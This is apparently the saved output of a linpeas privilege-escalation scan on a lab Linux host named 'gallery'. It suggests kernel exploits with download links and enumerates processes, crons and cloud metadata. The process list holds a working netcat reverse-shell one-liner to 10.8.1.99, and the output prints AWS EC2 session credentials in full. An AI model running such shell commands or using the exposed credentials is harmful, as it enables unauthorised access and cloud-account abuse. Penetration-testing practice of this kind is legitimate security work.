```
cat mike.out


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by github.com/PEASS-ng

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 4.15.0-167-generic (buildd@lcy02-amd64-045) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #175-Ubuntu SMP Wed Jan 5 01:56:07 UTC 2022
User & Groups: uid=1001(mike) gid=1001(mike) groups=1001(mike)
Hostname: gallery
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)



Caching directories DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.15.0-167-generic (buildd@lcy02-amd64-045) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #175-Ubuntu SMP Wed Jan 5 01:56:07 UTC 2022
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.6 LTS
Release:	18.04
Codename:	bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.21p2


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

╔══════════╣ Date & uptime
Tue Aug 20 12:28:13 UTC 2024
 12:28:13 up 51 min,  0 users,  load average: 0.15, 0.03, 0.01

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
/dev/disk/by-id/dm-uuid-LVM-47UUMpglUmCIKjJ4GwkEigDxsGED6f6WQzTFdTLYy6BOxYoOHUDSOFOIqUeVGqTE	/	ext4	defaults	0 0
/dev/disk/by-uuid/7db5879e-36e2-4ee4-b7e4-d6008335b7c9	/boot	ext4	defaults	0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?
LESSOPEN=| /usr/bin/lesspipe %s
HISTFILESIZE=0
MAIL=/var/mail/mike
USER=mike
SHLVL=2
OLDPWD=/opt
HOME=/home/mike
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
LOGNAME=mike
JOURNAL_STREAM=9:19571
_=./linpeas.sh
XDG_SESSION_ID=c1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
INVOCATION_ID=fcb737c202634360aaf0317a0589c35c
XDG_RUNTIME_DIR=/run/user/1001
APACHE_LOCK_DIR=/var/lock/apache2
LANG=en_US.UTF-8
HISTSIZE=0
LS_COLORS=
SHELL=/bin/bash
APACHE_RUN_GROUP=www-data
APACHE_RUN_USER=www-data
LESSCLOSE=/usr/bin/lesspipe %s %s
APACHE_LOG_DIR=/var/log/apache2
PWD=/tmp
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... disabled
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present (if any):
╔══════════╣ Am I Containered?
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No


                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. Yes
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ Aliyun ECS? .......................... No
═╣ Tencent CVM? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM? ............................ No
═╣ Azure APP? ........................... No

╔══════════╣ AWS EC2 Enumeration
ami-id: ami-0c76923f6d8ae40f3
instance-action: none
instance-id: i-0f12cdcd1c2484113
instance-life-cycle: spot
instance-type: t2.micro
region: eu-west-1

══╣ Account Info
{
  "Code" : "Success",
  "LastUpdated" : "2024-08-20T12:24:42Z",
  "AccountId" : "739930428441"
}

══╣ Network Info
Mac: 02:5e:01:f8:09:27/
Owner ID: 739930428441
Public Hostname: 
Security Groups: AllowEverything
Private IPv4s:

Subnet IPv4: 10.10.0.0/16
PrivateIPv6s:

Subnet IPv6: 
Public IPv4s:



══╣ IAM Role


══╣ User Data


EC2 Security Credentials
{
  "Code" : "Success",
  "LastUpdated" : "2024-08-20T12:25:13Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA2YR2KKQMZ375NNFC",
  "SecretAccessKey" : "5z1pFnXzZ5XAVh3vZTF78cEjS3wQFJCadTK2eEwm",
  "Token" : "IQoJb3JpZ2luX2VjEFUaCWV1LXdlc3QtMSJGMEQCIHolCl+D5+K+ErCNYcwqajueFGM+dipEvguBKT8sUDspAiBzSZ7lKyTdFFuIpBbPPLsvzh4dQKjt7FV5fataXlSGRSrGBAheEAMaDDczOTkzMDQyODQ0MSIMlCNuNgX6Lp8/fEhhKqME/xYqOh9a4y0Csy0u+jJSAUCPfiAtcd6D9wgetqkKbqbjjJkBWvoZkeCEkWGXS8lsw3JxPG7fm7ocznNaa4r+zGgYAve7Huq1kn35eeBsm1Olt7ssvFYRaXBflV6pfzwrr7DNiXTeppUvnJQMGdmV6Ltk1XD7rtRFXM1Ww0qGOUjMwHeBU7D8Wq8dRZEog/Vazu0LcBdp+CU9MvXmadePErh2CTqZ/3aOhZR3GoOr92Fagv/x0kIcm+yg0Meq9VD5e3AYkiXXgKUggiW4doXQe6lzunLDBwUT66HC1BLjyWa7D45bY+2S6SGFymO3F6F6Dv6LimZtHTTwLCapYAR50NGVNHcXFgCFay4dL9ivE9cUTQtRm93NyA4OJYP8I8OxlxtXF+Efatp/z95uyy5AeZuFjqa3dv1OLvEIFKocRVdVKpA4KH6/jmwwBhkH0iuL/wJACZ3gIEhuL2kWPB8Qe46ibbtjXRZ98RZLvQZqVv0FfuH87SddSJWRJcFmcRWXvkiPcuqoc+CMpLpCFtpjTbX7W17CweO7oyA+ANMQ1HDndvOGMs/Xp3o+Mb5lMSIr5D31dpc8DAfjwxxg8HHgjh4oKsNkliwR+ldK8jVqodKH0WKc/4TopX8miboWsBsVnbWK+USmT1s30auh5fmnVWZ4VhS8qtewlVywprT8oC7aLrmGZt0r8EqmXpLNnbWm3kpbGXaaHKRSma0eaz/0J2wdkDC+lpK2BjqUAtoH13NrSZpsfRr8/jeCK64zUOwFx9as6RVEpo5klDbclJj+eScyXdl066HD/bu2K/p4nCEv95sYJdkwJzqAVTVauB8wLzHWph421AuvJE/RN73PXgwTUQv1+p/0Nc0Np1uMHLGZlYvW08O0JA2XH5DzQPpSQKIpQu0PHGjZ0fp8wDZrufDx+26VT+KGHBrT8FxO+/dd0e/xUeNMC1CFBCKXzyKu/LuhBi9uE87abgVc/YLJYyHFJZVvOT4ggiTLfDP0ph7Xog2Bt+bx3P3isPrvVl0oCBTJabQ99fJY8bu1MC6ZzYx0KIJT4ub8DAfLgbbEcVahQssqOHk9tsO569L+OYdwRoAKT0yexr+daXsHEpL93w==",
  "Expiration" : "2024-08-20T18:42:57Z"
}
══╣ SSM Runnig
root       707  0.0  1.2 1232940 12312 ?       Ssl  11:37   0:00 /usr/bin/amazon-ssm-agent
root       829  0.0  2.5 1170504 26084 ?       Sl   11:37   0:00 /usr/bin/ssm-agent-worker
mike      1744  0.0  0.1  15240  1104 pts/0    S+   12:28   0:00 sed s,ssm-agent,?[1;31m&?[0m,


                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root         1  0.1  0.8 159656  8752 ?        Ss   11:36   0:06 /sbin/init maybe-ubiquity
root       452  0.0  1.2 127560 12652 ?        S<s  11:36   0:01 /lib/systemd/systemd-journald
root       454  0.0  0.1 105912  1828 ?        Ss   11:36   0:00 /sbin/lvmetad -f
root       463  0.0  0.4  45376  4224 ?        Ss   11:36   0:00 /lib/systemd/systemd-udevd
systemd+   582  0.0  0.2 141792  2980 ?        Ssl  11:36   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
systemd+   645  0.0  0.5  79928  5204 ?        Ss   11:36   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+   646  0.0  0.5  70500  5064 ?        Ss   11:36   0:00 /lib/systemd/systemd-resolved
daemon[0m     661  0.0  0.2  28340  2388 ?        Ss   11:37   0:00 /usr/sbin/atd -f
root       662  0.0  0.5  70472  5868 ?        Ss   11:37   0:00 /lib/systemd/systemd-logind
root       665  0.0  1.6 169108 17004 ?        Ssl  11:37   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       666  0.0  0.3  30036  3188 ?        Ss   11:37   0:00 /usr/sbin/cron -f
message+   667  0.0  0.4  50132  4760 ?        Ss   11:37   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
syslog     668  0.0  0.4 263044  4400 ?        Ssl  11:37   0:00 /usr/sbin/rsyslogd -n
root       669  0.0  2.6 453540 26216 ?        Ss   11:37   0:00 php-fpm: master process (/etc/php/7.2/fpm/php-fpm.conf)
www-data   751  0.0  1.3 455836 13484 ?        S    11:37   0:00  _ php-fpm: pool www
www-data   752  0.0  1.3 455836 13484 ?        S    11:37   0:00  _ php-fpm: pool www
root       670  0.0  0.6 286260  6900 ?        Ssl  11:37   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root       678  0.0  1.9 185960 19984 ?        Ssl  11:37   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       707  0.0  1.2 1232940 12312 ?       Ssl  11:37   0:00 /usr/bin/amazon-ssm-agent
root       829  0.0  2.5 1170504 26084 ?       Sl   11:37   0:00  _ /usr/bin/ssm-agent-worker
root       718  0.0  2.6 498592 26196 ?        Ss   11:37   0:00 /usr/sbin/apache2 -k start
www-data  3151  0.0  2.1 501788 21276 ?        S    11:53   0:00  _ /usr/sbin/apache2 -k start
www-data  3186  0.0  2.2 501740 22788 ?        S    11:53   0:00  _ /usr/sbin/apache2 -k start
www-data 10745  0.0  0.0   4636   828 ?        S    12:06   0:00  |   _ sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.1.99 4441 >/tmp/f
www-data 10748  0.0  0.0   4680   780 ?        S    12:06   0:00  |       _ cat /tmp/f
www-data 10749  0.0  0.1   4636  1636 ?        S    12:06   0:00  |       _ /bin/sh -i
www-data 30655  0.0  0.9  37436  9364 ?        S    12:21   0:00  |       |   _ python3 -c import pty; pty.spawn("/bin/bash")
www-data 30656  0.0  0.3  18516  3332 pts/0    Ss   12:21   0:00  |       |       _ /bin/bash
root     30659  0.0  0.3  60088  3392 pts/0    S    12:21   0:00  |       |           _ su mike
mike     30672  0.0  0.5  21360  5320 pts/0    S    12:22   0:00  |       |               _ bash
mike     30718  0.3  0.2   5320  2540 pts/0    S+   12:28   0:00  |       |                   _ /bin/sh ./linpeas.sh
mike      1758  0.0  0.0   5320   900 pts/0    S+   12:28   0:00  |       |                       _ /bin/sh ./linpeas.sh
mike      1762  0.0  0.3  38532  3692 pts/0    R+   12:28   0:00  |       |                       |   _ ps fauxwww
mike      1761  0.0  0.0   5320   900 pts/0    S+   12:28   0:00  |       |                       _ /bin/sh ./linpeas.sh
www-data 10750  0.0  0.2  15720  2128 ?        S    12:06   0:00  |       _ nc 10.8.1.99 4441
www-data  3197  0.0  2.1 501740 21180 ?        S    11:53   0:00  _ /usr/sbin/apache2 -k start
www-data  6875  0.0  2.1 501788 21300 ?        S    11:54   0:00  _ /usr/sbin/apache2 -k start
www-data  8390  0.0  2.1 501756 21212 ?        S    11:54   0:00  _ /usr/sbin/apache2 -k start
www-data  8395  0.0  2.1 501756 21252 ?        S    11:54   0:00  _ /usr/sbin/apache2 -k start
www-data 10710  0.0  2.0 501736 21088 ?        S    11:56   0:00  _ /usr/sbin/apache2 -k start
www-data 10711  0.0  2.0 501248 20200 ?        S    11:56   0:00  _ /usr/sbin/apache2 -k start
www-data 10712  0.0  1.9 501216 19536 ?        S    11:56   0:00  _ /usr/sbin/apache2 -k start
www-data 10714  0.0  2.0 501588 20632 ?        S    11:57   0:00  _ /usr/sbin/apache2 -k start
root       792  0.0  0.6 291456  7036 ?        Ssl  11:37   0:00 /usr/lib/policykit-1/polkitd --no-debug
mysql      853  0.2  8.7 682848 87700 ?        Ssl  11:37   0:07 /usr/sbin/mysqld
root       854  0.0  0.2  14672  2344 ttyS0    Ss+  11:37   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
root       872  0.0  0.1  14896  2004 tty1     Ss+  11:37   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
mike     30661  0.0  0.7  76524  7396 ?        Ss   12:22   0:00 /lib/systemd/systemd --user
mike     30662  0.0  0.2 193636  2488 ?        S    12:22   0:00  _ (sd-pam)

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes

╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user
Proc 582 with ppid 1 is run by user systemd-timesync but the ppid user is root
Proc 645 with ppid 1 is run by user systemd-network but the ppid user is root
Proc 646 with ppid 1 is run by user systemd-resolve but the ppid user is root
Proc 661 with ppid 1 is run by user daemon but the ppid user is root
Proc 667 with ppid 1 is run by user messagebus but the ppid user is root
Proc 668 with ppid 1 is run by user syslog but the ppid user is root
Proc 751 with ppid 669 is run by user www-data but the ppid user is root
Proc 752 with ppid 669 is run by user www-data but the ppid user is root
Proc 853 with ppid 1 is run by user mysql but the ppid user is root
Proc 3151 with ppid 718 is run by user www-data but the ppid user is root
Proc 3186 with ppid 718 is run by user www-data but the ppid user is root
Proc 3197 with ppid 718 is run by user www-data but the ppid user is root
Proc 6875 with ppid 718 is run by user www-data but the ppid user is root
Proc 8390 with ppid 718 is run by user www-data but the ppid user is root
Proc 8395 with ppid 718 is run by user www-data but the ppid user is root
Proc 10710 with ppid 718 is run by user www-data but the ppid user is root
Proc 10711 with ppid 718 is run by user www-data but the ppid user is root
Proc 10712 with ppid 718 is run by user www-data but the ppid user is root
Proc 10714 with ppid 718 is run by user www-data but the ppid user is root
Proc 30661 with ppid 1 is run by user mike but the ppid user is root
Proc 30672 with ppid 30659 is run by user mike but the ppid user is root

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND     PID   TID             USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 process found (dump creds from memory as root)
sshd Not Found

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root     722 Nov 16  2017 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 May 20  2021 .
drwxr-xr-x 102 root root 4096 Feb 12  2022 ..
-rw-r--r--   1 root root  589 Jan 14  2020 mdadm
-rw-r--r--   1 root root  712 Jan 17  2018 php
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--   1 root root  191 Aug  6  2020 popularity-contest

/etc/cron.daily:
total 64
drwxr-xr-x   2 root root 4096 Feb 12  2022 .
drwxr-xr-x 102 root root 4096 Feb 12  2022 ..
-rwxr-xr-x   1 root root  539 Jul 16  2019 apache2
-rwxr-xr-x   1 root root  376 Nov 11  2019 apport
-rwxr-xr-x   1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x   1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x   1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x   1 root root  539 Jan 14  2020 mdadm
-rwxr-xr-x   1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x   1 root root  249 Jan 25  2018 passwd
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x   1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x   1 root root  979 Mar  4  2018 rkhunter
-rwxr-xr-x   1 root root  214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Aug  6  2020 .
drwxr-xr-x 102 root root 4096 Feb 12  2022 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Aug  6  2020 .
drwxr-xr-x 102 root root 4096 Feb 12  2022 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x   2 root root 4096 Feb 12  2022 .
drwxr-xr-x 102 root root 4096 Feb 12  2022 ..
-rwxr-xr-x   1 root root  723 Apr  7  2018 man-db
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x   1 root root 1724 Mar  4  2018 rkhunter
-rwxr-xr-x   1 root root  403 Aug 23  2021 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/mariadb.service could be executing some relative path
/etc/systemd/system/mysqld.service could be executing some relative path
/etc/systemd/system/mysql.service could be executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                         LEFT          LAST                         PASSED    UNIT                         ACTIVATES
Tue 2024-08-20 12:39:00 UTC  10min left    Tue 2024-08-20 12:09:01 UTC  19min ago phpsessionclean.timer        phpsessionclean.service
Tue 2024-08-20 16:24:14 UTC  3h 55min left Tue 2024-08-20 11:37:09 UTC  51min ago motd-news.timer              motd-news.service
Tue 2024-08-20 17:44:26 UTC  5h 16min left Tue 2024-08-20 11:41:43 UTC  46min ago ua-timer.timer               ua-timer.service
Wed 2024-08-21 02:23:55 UTC  13h left      Tue 2024-08-20 11:37:09 UTC  51min ago apt-daily.timer              apt-daily.service
Wed 2024-08-21 06:52:14 UTC  18h left      Tue 2024-08-20 11:37:09 UTC  51min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Wed 2024-08-21 11:51:50 UTC  23h left      Tue 2024-08-20 11:51:50 UTC  36min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Mon 2024-08-26 00:00:00 UTC  5 days left   Tue 2024-08-20 11:37:09 UTC  51min ago fstrim.timer                 fstrim.service
n/a                          n/a           n/a                          n/a       ua-license-check.timer       ua-license-check.service
n/a                          n/a           n/a                          n/a       ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/etc/systemd/system/cloud-init.target.wants/cloud-init-hotplugd.socket is calling this writable listener: /run/cloud-init/hook-hotplug-cmd
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/lib/systemd/system/cloud-init-hotplugd.socket is calling this writable listener: /run/cloud-init/hook-hotplug-cmd
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
